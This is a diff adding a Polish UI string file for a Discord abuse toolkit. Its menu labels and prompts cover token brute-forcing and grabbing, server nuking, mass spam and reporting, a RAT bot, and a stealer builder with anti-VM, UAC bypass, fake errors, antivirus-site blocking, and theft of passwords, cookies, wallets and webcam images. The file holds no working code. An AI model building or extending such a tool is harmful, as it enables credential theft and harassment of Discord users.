@@ -1,0 +1,396 @@
+Informacje o tokenie{end_space5}
+Logowanie za pomocą tokenu
+Niszczyciel tokenów{end_space6}
+Pobieracz tokenów{end_space8}
+Wyłączacz tokenów{end_space8}
+Atak siłowy na token{end_space5}
+Sfałszowany pisarz{end_space7}
+Snajper wanity{end_space11}
+Spamer czatów grupowych{end_space2}
+Blokujący znajomych{end_space6}
+Usuwacz znajomych{end_space13}
+Usuwacz zaproszeń{end_space8}
+Tworzenie nowych serwerów
+Zmieniacz profilu{end_space8}
+Pobieracz kodów QR{end_space7}
+Bot Discord RAT{end_space10}
+Naciskacz przycisku{end_space6}
+Reaktor wiadomości{end_space7}
+Masowe PW{end_space16}
+Masowe zgłaszanie{end_space8}
+Masowe dodawanie przyjaci
+Usuń DMS{end_space17}
+Czyszczenie DMS{end_space10}
+Ominiecie zasad{end_space10}
+Ominiecie RestoreCord{end_space4}
+Ominiecie Sledge Hammer{end_space2}
+Narzędzie Webhooków{end_space6}
+Stworzone przez Plingenn{end_space1}
+Dziennik zmian{end_space11}
+Ustawienia{end_space15}
+Czat
+Zarządzanie tokenami
+Nast strona
+Uruchomiony na:{end_space11}
+Nieprawidłowy wybór, spróbuj ponownie!
+Przerwane przez użytkownika.
+Zmieniacz motywu
+Ustawienia konta
+Ustawienia proxy
+Ustawienia wyglądu
+Przełącz tryb debugowania
+Panel administratora
+Nieprawidłowe ustawienie
+CYJAN
+NIEBIESKI
+ZIELONY
+CZERWONY
+BIAŁY
+ŻÓŁTY
+MAGENTA
+JASNY CZERWONY
+JASNY NIEBIESKI
+JASNY ZIELONY
+JASNY CYJAN
+JASNY CZARNY
+Motyw ustawiony na
+Przegląd konta
+Moja licencja
+Historia zakupów
+Wykorzystaj kod
+Pobierz oprogramowanie
+Nazwa użytkownika
+Stworzony
+Zmień nazwę użytkownika
+Wyloguj
+Zmiana nazwy użytkownika nie powiodła się. Nazwa użytkownika musi zawierać co najmniej 3 znaki.
+Czy chcesz się wylogować z konta? (T/N)
+Produkt
+Wygasa w
+Data
+Wprowadź swój kod produktu, aby uzyskać zawartość.
+Kod
+Już wykorzystałeś kod.
+Upewnij się, że zapisujesz swój produkt przed naciśnięciem Enter!
+Klucz nie znaleziony w odpowiedzi
+Nie udało się pobrać danych dla podanego kodu
+Adres URL nie znaleziony w informacjach o kodzie
+Nieprawidłowy kod!
+Przełącz użycie proxy
+Wyczyść pamięć podręczną proxy
+Dodaj własne proxy do pamięci podręcznej
+Skrobaczka proxy
+Nieprawidłowy wybór
+Tryb debugowania przełączony {RED}WYŁĄCZONY
+Tryb debugowania przełączony {GREEN}WŁĄCZONY
+Dodano nowy system uwierzytelniania
+Udoskonalony system konfiguracji
+Przebudowany interfejs panelu
+Dodany system czatu
+Dodane nowe ustawienia konta
+Wdrożono buforowanie dla lepszej wydajności
+Niestandardowy Discord RPC
+Przełącz Discord RPC
+Przełącz niestandardowe Discord RPC
+Edytuj niestandardowe Discord RPC
+Niestandardowe Discord RPC przełączone WYŁĄCZONE
+Niestandardowe Discord RPC przełączone WŁĄCZONE
+Szczegóły (Wymagane)
+Szczegóły muszą zawierać co najmniej 3 znaki.
+Stan (Wymagane)
+Stan musi mieć co najmniej 3 znaki.
+URL duże obrazu (Opcjonalnie)
+Duży tekst (Opcjonalnie)
+URL małego obrazu (Opcjonalnie)
+Mały tekst (Opcjonalnie)
+Ilu przycisków chcesz mieć?
+Wprowadź etykietę dla przycisku
+Wprowadź URL dla przycisku
+Nieprawidłowy format URL. Wprowadź poprawny URL.
+Nieprawidłowa liczba przycisków. Wprowadź liczbę od 0 do 2.
+Discord RPC wyłączony
+Discord RPC włączony
+Tryb normalny
+Tryb RestoreCord (omijanie captcha)
+Sprawdzacz pamięci podręcznej
+Sprawdzacz niestandardowy
+Sprawdzacz serwera
+Wprowadź niestandardową ścieżkę do wczytania tokenów
+Normalny czat
+Czat wsparcia (Niedostępny)
+Prywatny czat (Niedostępny)
+Wyszukiwanie serwera{end_space5}
+Kloner serwera{end_space11}
+Niszczyciel serwera{end_space6}
+Dołączacz tokenów{end_space8}
+Opuściciel tokenów{end_space7}
+Spamer tokenów{end_space11}
+Atak{end_space21}
+Spamer SoundBoardu{end_space7}
+Dołącz do czatu głosowego
+Zmieniacz obrazu profilowego{end_space1}
+Globalny zmieniacz nicków
+Zmieniacz pseudonimów{end_space7}
+Zmieniacz HypeSquadu{end_space5}
+Zmieniacz zaimków{end_space8}
+Zmieniacz języka{end_space9}
+Zmieniacz statusu{end_space8}
+Zmieniacz motywu{end_space9}
+Zmieniacz bio{end_space12}
+Generator kont{end_space11}
+Twórca VideoCrash{end_space8}
+Cykler ustawień{end_space14}
+Notatki o aktualizacji{end_space3}
+Telegram{end_space17}
+Selfbot{end_space18}
+Github{end_space19}
+O programie{end_space14}
+Wyjdź{end_space20}
+Poprz. strona{end_space2}
+Nazwy serwerów
+Wiadomość
+Liczba wątków
+Wystąpił błąd:
+Nie znaleziono żadnych tokenów w pamięci podręcznej
+Wdrażanie Rain Nuke
+Rain Nuke wdrożony. . .
+Wysyłanie wiadomości
+ID wiadomości:
+Wysłano wiadomość do wszystkich dostępnych znajomych.
+Opuścił serwer:
+Usunięty serwer:
+Następujący błąd został napotkany i jest ignorowany:
+Usunięto/opuszczono wszystkie dostępne serwery.
+Usuwanie znajomego:
+Usunięto znajomego:
+Usunięto wszystkich dostępnych znajomych.
+Tworzenie
+Utworzono
+Utworzono wszystkie serwery.
+Rain Nuke pomyślnie zdetonowany!
+Pomyślnie przekształcono w Pustkowie Reme
+Wprowadź cokolwiek, aby kontynuować. . .
+Rozpoczynanie trybu ataku (Przełączanie Light/dark mode)
+Za mało znajomych, aby kontynuować.
+Wystąpił błąd podczas przetwarzania tokenu
+Spamer kanału
+ID kanału
+Ominąć zasady
+ID serwera
+Fałszywy typer tokenów
+Globalny przezwyciężający
+Pseudonim
+Przezwyciężający serwer
+Zmieniacz zaimków
+Losowe zaimki (t/n)
+Zaimki
+Usunięto DM:
+Za mało DM, aby kontynuować.
+Przerwany cykl
+Spamer SoundBoardu
+Program przerwany przez użytkownika.
+Nie udało się wysłać bicia serca z tokenem:
+Nie udało się dołączyć do VC z tokenem:
+Dołączanie do VC z tokenami..
+Pomyślnie zaktualizowano zaproszenie, twój serwer może teraz być dostępny przez
+Nie udało się zaktualizować adresu URL wanity. Kod statusu:
+Kod wanity do podglądu
+ID serwera do zastosowania wanity
+Opóźnienie między sprawdzaniami (sekundy)
+Snajper wanity został uruchomiony. Naciśnij Ctrl+C, aby zatrzymać.
+Błąd:
+Spamer webhooków
+Usuwanie webhooków
+Webhook
+Webhook pomyślnie usunięty
+Manager tokenów
+Zapisz tokeny
+Wyczyść tokeny
+Sprawdź tokeny i zapisz tylko poprawne (t/n)
+Pamięć podręczna tokenów wyczyszczona.
+Wprowadź ścieżkę do pliku tekstowego zawierającego tokeny
+Nie znaleziono żadnych tokenów w określonym pliku tekstowym
+Sprawdzacz tokenów
+Nie udało się pobrać nazwy serwera:
+Dołączanie
+Brute-force tokenów Rain. PS: To może zająć dużo czasu.
+Jeśli masz ogromne szczęście i uda ci się zdobyć czyjś token, znajdziesz go w pliku 'brute-force.txt'.
+Zawsze uzyskaj wyraźną zgodę od osoby przed przeprowadzeniem ataku brute force na jej koncie.
+Nieprawidłowe ID użytkownika, spróbuj ponownie!
+POPRAWNE
+NIEPOPRAWNE
+Błąd pobierania źródeł płatności:
+Błąd pobierania danych Nitro:
+Brak dostępnych informacji o płatnościach.
+Gromadzenie informacji o użytkowniku i sterownikach sieci..
+Nazwa pliku
+Hasło do pliku
+Czy chcesz dostarczyć plik ikony? (T/N)
+Nieprawidłowa ścieżka lub URL ikony. Ustawienie ikony na Brak.
+Pinguj mnie (T/N)
+Anty VM (T/N)
+Uruchom przy starcie (T/N)
+UacBypass (T/N)
+Stopienie (T/N)
+Ukryj konsolę (T/N)
+Zachwycanie kamerą (T/N)
+Zachwycanie haseł (T/N)
+Zachwycanie ciasteczek (T/N)
+Zachwycanie automatycznych wypełnień (T/N)
+Zachwycanie historii (T/N)
+Zachwycanie tokenów Discorda (T/N)
+Zachwycanie gier (T/N)
+Zachwycanie haseł Wi-Fi (T/N)
+Zachwycanie informacji systemowych (T/N)
+Zachwycanie zrzutu ekranu (T/N)
+Zachwycanie Telegramu (T/N)
+Zachwycanie wspólnych plików (T/N)
+Zachwycanie portfeli (T/N)
+Fałszywy błąd (T/N)
+Fałszywy tytuł błędu
+Fałszywa wiadomość błędu
+Blokowanie stron AV (T/N)
+Wstrzyknięcie Discorda (T/N)
+Ikona pliku
+Tworzenie {name}.exe, To zajmie kilka sekund. Dziękujemy za cierpliwość!
+Plik znajduje się w 'output/grabberbuilder/{name}.exe
+Utworzono grupowy czat
+Ograniczenie tempa ({response.json()['retry_after']}ms)
+Za mało znajomych dostępnych do losowego wyboru
+Czy chcesz wybrać użytkowników samodzielnie do spamowania grupowymi czatami, czy chcesz losowo wybrać?
+Wybierz użytkowników samodzielnie
+Losuj użytkowników
+Tworzenie grupowych czatów
+Identyfikatory użytkowników
+Nie miałeś żadnych przecinków (,) format to id,id2,id3
+w dowolnym momencie, aby zatrzymać
+Zablokowani:
+Błąd pobierania relacji:
+Za mało żądań o przyjaźń do kontynuacji.
+Przychodząca prośba o przyjaźń od:
+Usunięto prośbę o przyjaźń od:
+Łącznie usunięto prośby o przyjaźń:
+Wystąpił błąd podczas tworzenia {server_name}: {e}
+Ikona dla serwerów tak/nie
+Losowe nazwy serwerów
+Niestandardowe nazwy serwerów
+Nazwy serwerów, które zostaną utworzone
+Proszę podać lokalizację ikony
+Nie można znaleźć "{image}" na twoim komputerze
+Niestandardowy status
+Niestandardowe bio
+Tworzenie pliku... {i}
+Zapisywanie pliku... {i}
+Uwaga: Ten kod nie jest w pełni działający w tej chwili, ale nadal jest uruchamialny.\nMożesz jednak napotkać błędy lub błędy.
+Wprowadź nazwę, którą chcesz nadać ostatecznemu plikowi
+Wprowadź token bota, który będziesz używać do wykonywania poleceń RAT
+Token bota
+Wprowadź ID gildii, na którym zarejestrowane są polecenia slash
+Błąd zapisywania pliku: {e}
+Plik został poprawnie zapisany jako "output/{fileName}.py"
+Czy chcesz przekonwertować swój skrypt na plik wykonywalny (T/N)
+Tworzenie pliku...
+Czyszczenie starych plików...
+Plik wykonywalny został poprawnie wygenerowany
+Wystąpił błąd HTTP: {e}
+Identyfikator wiadomości
+Proszę wybrać przycisk, który chcesz nacisnąć
+{r}({LIGHTBLACK_EX}{i}{r}) Nazwa: {LIGHTBLACK_EX}{button_label}{r}, Niestandardowe ID: {LIGHTBLACK_EX}{button_custom_id}
+Przycisk
+Znaleziono tylko jeden przycisk w wiadomości.
+Nie udało się dodać reakcji {reaction} do wiadomości {message_id}. Osiągnięto już maksymalną liczbę reakcji.
+Osiągnięto już maksymalną liczbę reakcji.
+Nie udało się dodać reakcji {reaction} do wiadomości {message_id}. Zakazane: {error_message}
+Obiekty
+Twarze
+Zwierzęta
+Symbole
+Brak emoji w odpowiedzi
+Nie udało się pobrać emoji z API
+Link do zaproszenia
+Nieprawidłowy format linku zaproszenia.
+Wystąpił błąd podczas wysyłania żądania
+Informacje o zaproszeniu:
+Informacje o zapraszającym:
+Informacje o serwerze:
+Kanał
+Data wygaśnięcia
+ID użytkownika
+Odznaki
+Niedostępne
+Nazwa
+ID serwera
+Opis
+Baner
+URL banera
+URL banera (niedostępny)
+URL dostępności
+Poziom weryfikacji
+Splash
+URL splasha
+URL splasha (niedostępny)
+Funkcje
+Rozpoczęto napad. Naciśnij Ctrl+C, aby zatrzymać.
+Napad przerwany
+Rozpoczęto cykl językowy. Naciśnij Ctrl+C, aby zatrzymać.
+Nieprawidłowy token.
+Naciśnij ENTER, aby kontynuować
+Narzędzie Discord API | https://Rain.xyz | Wykonane przez Plingenn
+Ustawienia wyglądu
+Ustawienia tekstu
+Ustawienia kursora
+Ustawienia przezroczystości
+Ustawienia okna
+Ustawienia języka
+Schemat kolorów
+Czcionka
+Rozmiar czcionki
+Wysokość linii
+Grubość czcionki
+Efekty retro terminala
+Ustawienia kolorów
+Ustawienia czcionki
+Ustawienia rozmiaru czcionki
+Ustawienia wysokości linii
+Ustawienia grubości czcionki
+Ustawienia retro
+Ustawienia kursora
+Język ustawiony na {chosen_language}
+Bez nazwy
+Typ
+Dom
+Link do wiadomości
+Nieprawidłowy link do wiadomości
+Powrót...
+Nie udało się połączyć z Discord RPC: {e}
+Wybór
+Motyw
+Ustawienie
+Edytuj
+Język
+Przezroczystość panelu
+Nieprawidłowa przezroczystość
+Ustawienia okna
+Ta opcja jest w trakcie opracowywania
+Ta opcja jest obecnie niedostępna. Prosimy o cierpliwość, zostanie dodana później.
+Ta opcja jest obecnie niedostępna.
+Zostanie ona zastąpiona w jednej z nadchodzących aktualizacji: '{replacement}'.
+Ta opcja nie jest dostępna
+Te opcje są obecnie w trakcie rozwoju
+Te opcje są obecnie w trakcie rozwoju, ale nadal można z nich korzystać. Jednakże, mogą wystąpić błędy lub problemy.
+Nie udało się pobrać zaimków od {pronounce_url} ({statuscode})
+Użycie proxy jest obecnie niedostępne. Przepraszamy za wszelkie niedogodności. Będzie dostępne w jednej z naszych nadchodzących aktualizacji.
+Użycie proxy zostało przełączone {RED}WYŁĄCZONE
+Użycie proxy zostało przełączone {GREEN}WŁĄCZONE
+Pomyślnie zapisano nowe proxy
+Pomyślnie zebrano proxy
+Gotowe! Zebrane {proxies} w sumie => {temp} | {execution_time}ms
+PC
+Wdrożono obsługę wielojęzyczną.
+Wątek masowy{end_space13}
+Spamujący na forum
+Masowy użytkownik DM{end_space5}
+N/D (nie dotyczy){end_space8}
+Wzmacniacz serwera{end_space12}
+Online z tokenem{end_space9}
+Twórca ankiet{end_space12}
